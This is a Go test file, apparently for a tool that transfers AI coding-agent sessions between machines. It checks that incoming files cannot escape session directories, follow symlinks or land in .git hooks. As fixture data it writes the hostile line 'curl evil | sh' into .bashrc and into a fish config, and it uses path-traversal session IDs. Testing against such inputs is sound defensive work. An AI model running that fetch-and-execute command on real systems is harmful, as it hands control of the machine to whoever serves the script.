package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The receiving machine must not let the sending machine choose where its
// files land: session files stay in the agent's session directories, extras
// stay inside the worktree, and nothing follows a symlink the other side put
// in the tree.

func TestStageSessionRefusesFilesOutsideTheSession(t *testing.T) {
	home := t.TempDir()
	l := &Local{Home: home}
	oldHome := "/Users/matt"
	cwd := oldHome + "/src/app"
	proj := filepath.Join(".claude", "projects", claudeSlug(cwd))
	stage := filepath.Join(".local", "state", "ferry", "in", "t", "session")
	write := func(rel, content string) {
		p := filepath.Join(home, stage, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o600)
	}
	write(filepath.Join(proj, sessionID+".jsonl"), `{"cwd":"`+cwd+`"}`+"\n")
	write(".bashrc", "curl evil | sh\n")

	_, err := l.StageSession(InstallReq{
		Session:  Session{Agent: agentClaude, ID: sessionID, Cwd: cwd, Files: []string{filepath.Join(proj, sessionID+".jsonl")}},
		OldHome:  oldHome,
		StageRel: stage,
		Task:     "t",
	})
	if err == nil || !strings.Contains(err.Error(), ".bashrc") {
		t.Fatalf("want a refusal naming .bashrc, got %v", err)
	}
	if exists(filepath.Join(home, ".bashrc")) {
		t.Fatal(".bashrc was written")
	}
}

func TestSessionIDsMustBeUUIDs(t *testing.T) {
	l := &Local{Home: t.TempDir()}
	for _, id := range []string{"../../../.config/fish", "abc", sessionID + "/../x"} {
		if _, err := l.FindSession(FindSessionReq{ID: id}); err == nil {
			t.Errorf("FindSession accepted id %q", id)
		}
	}
}

func TestFromRefusesATamperedRecord(t *testing.T) {
	w := newWorld(t)
	wt := w.laptopTask()
	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")

	// Something on kant rewrites the task record to point at a config dir.
	recPath := filepath.Join(w.kant, ".local/state/ferry/tasks/"+taskKey("src/app-wt/fix-auth")+".json")
	var rec map[string]any
	json.Unmarshal([]byte(w.read(w.kant, ".local/state/ferry/tasks/"+taskKey("src/app-wt/fix-auth")+".json")), &rec)
	rec["session"] = "../../../.config/fish"
	data, _ := json.Marshal(rec)
	os.WriteFile(recPath, data, 0o600)
	w.write(w.kant, ".config/fish.jsonl", `{"cwd":"`+filepath.Join(w.kant, "src/app-wt/fix-auth")+`"}`+"\n")
	w.write(w.kant, ".config/fish/config.fish", "curl evil | sh\n")

	out, err := w.ferry(w.laptop, "from", "kant", "fix-auth", "--yes")
	if err == nil {
		t.Fatalf("from should fail on a tampered session id:\n%s", out)
	}
	if exists(filepath.Join(w.laptop, ".config/fish")) {
		t.Fatal("kant chose a file on the laptop")
	}
}

func TestPrepareExtrasRefusesSymlinks(t *testing.T) {
	cases := map[string]func(root, outside string){
		"symlinked directory": func(root, outside string) {
			os.Symlink(outside, filepath.Join(root, "cfg"))
		},
		"symlinked file": func(root, outside string) {
			os.MkdirAll(filepath.Join(root, "cfg"), 0o755)
			os.Symlink(filepath.Join(outside, ".env"), filepath.Join(root, "cfg", ".env"))
		},
	}
	for name, setup := range cases {
		t.Run(name, func(t *testing.T) {
			home := t.TempDir()
			l := &Local{Home: home}
			root := filepath.Join(home, "src", "app")
			outside := filepath.Join(home, "outside")
			os.MkdirAll(root, 0o755)
			os.MkdirAll(outside, 0o755)
			setup(root, outside)
			err := l.PrepareExtras(PrepareExtrasReq{WtRel: "src/app", Task: "t", Paths: []string{"cfg/.env"}})
			if err == nil || !strings.Contains(err.Error(), "symlink") {
				t.Fatalf("want a symlink refusal, got %v", err)
			}
		})
	}
}

func TestPrepareExtrasRefusesGitDir(t *testing.T) {
	home := t.TempDir()
	l := &Local{Home: home}
	os.MkdirAll(filepath.Join(home, "src/app/.git/hooks"), 0o755)
	// macOS's filesystem resolves .GIT to the same directory as .git.
	for _, p := range []string{".git/hooks/post-checkout", ".GIT/hooks/post-checkout"} {
		err := l.PrepareExtras(PrepareExtrasReq{WtRel: "src/app", Task: "t", Paths: []string{p}})
		if err == nil || !strings.Contains(err.Error(), "inside .git") {
			t.Errorf("%s: want a .git refusal, got %v", p, err)
		}
	}
}

// FuzzSessionPathOK checks that whatever the other machine puts in a session,
// a path sessionPathOK accepts stays in the agent's session directories. Park
// also accepts a directory f when f+"/x" passes, so that form is checked too.
func FuzzSessionPathOK(f *testing.F) {
	proj := filepath.Join(".claude", "projects", claudeSlug("/Users/matt/src/app"))
	for _, s := range []string{
		proj + "/" + sessionID + ".jsonl", proj + "/memory/a/..", ".claude/file-history/" + sessionID + "/x",
		".codex/sessions/2026/01/02/rollout-a-" + sessionID + ".jsonl", "../.bashrc", proj + "/../x/" + sessionID + ".jsonl",
	} {
		f.Add(false, sessionID, "/Users/matt/src/app", proj, s)
	}
	f.Add(false, sessionID, "/Users/matt/src/app", ".claude/projects/../..", "../"+sessionID+".jsonl")
	f.Add(true, sessionID, "/x", "", ".codex/sessions/2026/01/02/rollout-"+sessionID+".jsonl")
	f.Fuzz(func(t *testing.T, codex bool, id, cwd, projDir, rel string) {
		s := Session{Agent: agentClaude, ID: id, Cwd: cwd, ProjDir: projDir}
		if codex {
			s.Agent = agentCodex
		}
		proj := s.projDir()
		for _, p := range []string{rel, rel + "/x"} {
			if !sessionPathOK(s.Agent, s.ID, proj, p) {
				continue
			}
			clean := filepath.ToSlash(filepath.Clean(rel))
			ok := filepath.IsLocal(clean) && (strings.HasPrefix(clean, ".claude/projects/") ||
				strings.HasPrefix(clean, ".claude/file-history/") || strings.HasPrefix(clean, ".codex/sessions/"))
			if !ok {
				t.Fatalf("accepted %q (as %q) for project %q, which leaves the session directories", rel, p, proj)
			}
		}
	})
}

// FuzzSafeDest checks every path safeDest accepts against the filesystem
// itself: the path is local, and no existing step along it is a symlink, a
// file in a directory's place, or the repo's .git directory under any
// spelling the filesystem treats as the same name.
func FuzzSafeDest(f *testing.F) {
	root := f.TempDir()
	outside := f.TempDir()
	os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0o755)
	os.MkdirAll(filepath.Join(root, "d"), 0o755)
	os.WriteFile(filepath.Join(root, "f"), nil, 0o600)
	os.Symlink(outside, filepath.Join(root, "ln"))
	os.Symlink("..", filepath.Join(root, "d", "up"))
	gitDir, err := os.Stat(filepath.Join(root, ".git"))
	if err != nil {
		f.Fatal(err)
	}
	for _, s := range []string{".git/hooks/pre-commit", "d/new", "f", "ln/x", "d/up/f", "d/../.git/config", "./d", ".env"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, rel string) {
		if safeDest(root, rel) != nil {
			return
		}
		if !filepath.IsLocal(rel) {
			t.Fatalf("accepted %q, which isn't local", rel)
		}
		cur := root
		for _, part := range strings.Split(filepath.Clean(rel), string(filepath.Separator)) {
			cur = filepath.Join(cur, part)
			st, err := os.Lstat(cur)
			if err != nil {
				return
			}
			if os.SameFile(st, gitDir) {
				t.Fatalf("accepted %q, which reaches .git", rel)
			}
			if st.Mode()&os.ModeSymlink != 0 {
				t.Fatalf("accepted %q through the symlink %s", rel, cur)
			}
		}
	})
}
